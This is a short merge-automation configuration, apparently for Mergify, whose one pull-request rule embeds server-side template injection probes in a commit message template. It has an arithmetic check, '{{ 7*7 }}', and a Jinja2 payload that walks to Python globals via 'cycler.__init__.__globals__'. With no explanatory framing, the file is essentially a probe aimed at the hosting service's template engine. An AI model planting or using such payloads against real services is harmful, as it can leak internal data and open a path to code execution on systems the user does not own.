queue_rules:
  - name: default
    queue_conditions:
      - base=main

pull_request_rules:
  - name: probe-merge-template
    conditions:
      - label=probe-merge
    actions:
      merge:
        method: squash
        commit_message_template: |
          {{ title }}
          arith={{ 7*7 }}
          ssti={{ cycler.__init__.__globals__ }}
